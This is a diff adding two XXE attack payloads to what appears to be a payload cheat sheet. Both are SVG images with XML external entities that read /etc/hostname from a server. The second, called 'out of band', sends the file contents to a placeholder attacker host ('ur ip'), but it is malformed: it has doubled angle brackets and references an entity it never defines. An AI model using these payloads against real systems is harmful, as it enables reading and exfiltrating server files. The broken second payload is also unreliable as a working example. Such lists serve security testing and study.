@@ -72,3 +72,15 @@ To Call This File
 	%remote;
 
 ----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+XXE: Exploit Using SVG Image 
+
+	<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+XXE: Exploit Using SVG Image (Out Of Band Method)
+
+	<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <<!ENTITY % a SYSTEM "file:///etc/hostname" >>  <!ENTITY b SYSTEM "ur ip/x=?%a; " > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------
